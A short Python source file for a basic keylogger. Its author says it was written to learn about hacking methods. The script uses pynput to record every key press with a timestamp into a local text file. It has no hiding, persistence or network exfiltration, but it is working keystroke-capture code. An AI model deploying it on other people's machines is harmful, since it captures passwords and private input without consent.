# keylogger.py - created 27/08/2021
# description: A basic keylogger. Implemented to help strengthen my knowledge of various hacking/cyber security
#   methods. Used for educational purposes only
# @author Lauren Bassett

# Imports the relevant pynput packages
from pynput.keyboard import Key, Listener
import logging

# Specifies the directory in which the text file will be stored
# Assigning an empty string means the .txt is stored in the same place as keylogger.py
log_dir = ""

# Sets up basic config. Specifies file name and the format in which logs are stored
logging.basicConfig(filename=(log_dir + "keylogs.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


# Which each press, record each log as a string
def on_press(key):
    logging.info(str(key))


# Assigns an event listener so with every key press, the function on_press is called
with Listener(on_press=on_press) as listener:
    # Joins the listener to the main body of code
    listener.join()
